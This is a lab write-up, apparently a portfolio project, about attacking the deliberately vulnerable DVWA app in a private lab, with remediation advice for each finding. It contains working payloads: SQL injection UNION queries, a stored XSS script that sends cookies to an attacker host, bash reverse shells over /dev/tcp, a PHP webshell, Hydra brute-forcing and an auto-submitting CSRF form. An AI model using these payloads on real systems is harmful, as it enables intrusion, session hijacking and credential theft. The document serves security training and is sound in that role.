# Project 05 — Web Application Testing

**Skills:** OWASP Top 10, Burp Suite, Manual Testing, SQL Injection, XSS, CSRF, Command Injection

---

## Objective

Test the DVWA (Damn Vulnerable Web Application) for OWASP Top 10 vulnerabilities using a combination of manual techniques and Burp Suite. Document each vulnerability with proof-of-concept and remediation guidance.

---

## Environment

| VM | IP | Role |
|----|----|------|
| kali | 10.10.10.10 | Attacker |
| dvwa | 10.20.20.40 | Target (DVWA) |

DVWA accessed at `http://10.20.20.40/dvwa/` — security level set to **Low** initially, then **Medium** to test bypass techniques.

---

## Setup: Configuring Burp Suite as Proxy

1. In Burp Suite: **Proxy → Options → Add listener** on `127.0.0.1:8080`
2. In Firefox: configure proxy to `127.0.0.1:8080`
3. Install Burp CA certificate to avoid SSL errors
4. Intercept is now on for all browser traffic through Kali

---

## Vulnerability 1 — SQL Injection

**OWASP Category:** A03:2021 – Injection

### Testing

In the DVWA **SQL Injection** module, input field accepts a User ID.

```
# Basic test — always-true condition
1' OR '1'='1

# Error-based — identify DB type
1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--

# UNION-based — extract data
1' UNION SELECT null, table_name FROM information_schema.tables--
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--
1' UNION SELECT user, password FROM users--
```

**Result:** Retrieved all usernames and MD5 password hashes from the `users` table.

```
admin : 5f4dcc3b5aa765d61d8327deb882cf99 (cracked: password)
gordon: e99a18c428cb38d5f260853678922e03 (cracked: abc123)
```

### SQLMap (Automated)

```bash
sqlmap -u "http://10.20.20.40/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>; security=low" \
  --dbs --dump
```

### Remediation

- Use parameterized queries / prepared statements
- Implement input validation and allowlisting
- Use a WAF
- Run the database with least privilege

---

## Vulnerability 2 — Cross-Site Scripting (XSS)

**OWASP Category:** A03:2021 – Injection

### Reflected XSS

```javascript
// Input in the name field
<script>alert(document.cookie)</script>

// Bypass basic filters
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

**Result:** JavaScript executed in browser, cookie value displayed.

### Stored XSS

In the DVWA message board:

```javascript
// Stored payload that fires for every visitor
<script>
  var i = new Image();
  i.src = "http://10.10.10.10:8000/?cookie=" + encodeURIComponent(document.cookie);
</script>
```

```bash
# Cookie stealer listener on Kali
python3 -m http.server 8000
# Received: GET /?cookie=PHPSESSID=abc123;security=low
```

**Result:** Session cookie captured — allows session hijacking.

### Remediation

- Encode all output (HTML entity encoding)
- Implement Content Security Policy (CSP)
- Use HTTPOnly and Secure cookie flags
- Validate and sanitize all user input

---

## Vulnerability 3 — Command Injection

**OWASP Category:** A03:2021 – Injection

In the DVWA **Command Injection** module, a ping utility accepts user input.

```bash
# Input: chain commands with semicolon
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la /var/www/html

# Reverse shell
127.0.0.1; bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

On Kali:
```bash
nc -lvnp 4444
# Received connection as www-data
```

**Result:** Full operating system command execution and reverse shell.

### Remediation

- Never pass user input to system shell commands
- Use language-native functions (e.g., PHP's `escapeshellarg()`)
- Implement allowlisting for expected input formats

---

## Vulnerability 4 — Broken Authentication / Brute Force

**OWASP Category:** A07:2021 – Identification and Authentication Failures

### Brute Force Attack

```bash
# Using Hydra against DVWA login
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  10.20.20.40 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

**Result:** Password `password` found for user `admin` in < 30 seconds.

### Using Burp Intruder

1. Capture login request in Burp Proxy
2. Send to Intruder
3. Mark `password` field as payload position
4. Load `rockyou.txt` as wordlist
5. Look for 302 redirect (successful login) vs 200 (failure)

### Remediation

- Implement account lockout after failed attempts
- Rate limiting on authentication endpoints
- Multi-factor authentication (MFA)
- Use a CAPTCHA

---

## Vulnerability 5 — Insecure File Upload

**OWASP Category:** A04:2021 – Insecure Design

DVWA has a file upload functionality with minimal validation.

```bash
# Create PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via browser — DVWA Low: no restriction
# Access at: http://10.20.20.40/dvwa/hackable/uploads/shell.php?cmd=id

# Execute commands
curl "http://10.20.20.40/dvwa/hackable/uploads/shell.php?cmd=whoami"
# www-data

# Upgrade to reverse shell
curl "http://10.20.20.40/dvwa/hackable/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/10.10.10.10/4444+0>%261"
```

### Bypassing Medium Security

```bash
# DVWA Medium: checks Content-Type (image/jpeg required)
# Intercept upload in Burp, change Content-Type header to image/jpeg
# Filename: shell.php.jpg → still parsed as PHP by misconfigured Apache
```

### Remediation

- Validate file type using server-side magic bytes, not extension or Content-Type
- Store uploads outside web root
- Rename uploaded files to random names without extension
- Serve files through a dedicated non-PHP handler

---

## Vulnerability 6 — CSRF (Cross-Site Request Forgery)

**OWASP Category:** A01:2021 – Broken Access Control

DVWA's password change functionality is vulnerable to CSRF (on Low security level).

```html
<!-- Malicious page hosted on attacker server -->
<html>
<body onload="document.forms[0].submit()">
  <form action="http://10.20.20.40/dvwa/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="hacked123">
    <input type="hidden" name="password_conf" value="hacked123">
    <input type="hidden" name="Change" value="Change">
  </form>
</body>
</html>
```

If an authenticated DVWA user visits this page, their password is changed to `hacked123`.

### Remediation

- Implement CSRF tokens (synchronizer token pattern)
- Use `SameSite=Strict` cookie attribute
- Verify the `Origin` and `Referer` headers

---

## Summary of Findings

| Vulnerability | OWASP Category | Severity | Exploited |
|--------------|----------------|----------|-----------|
| SQL Injection | A03 Injection | Critical | ✅ DB dump |
| Command Injection | A03 Injection | Critical | ✅ RCE + reverse shell |
| Stored XSS | A03 Injection | High | ✅ Session hijacking |
| Insecure File Upload | A04 Insecure Design | High | ✅ Webshell + RCE |
| Brute Force | A07 Auth Failures | High | ✅ Password cracked |
| CSRF | A01 Broken Access Control | Medium | ✅ Password changed |

---

## Key Takeaways

- OWASP Top 10 vulnerabilities are reliably present in applications that don't follow secure development practices
- Burp Suite's Repeater and Intruder are essential for manual testing and iterating on payloads
- Automated scanners (sqlmap) confirm manual findings and speed up exploitation, but manual analysis is still required to understand impact
- Multiple vulnerability classes often chain together in real attacks (e.g., XSS → session hijacking → CSRF)

---

## Next Steps

→ [Project 06 — SIEM & Log Analysis](06-siem-log-analysis.md)
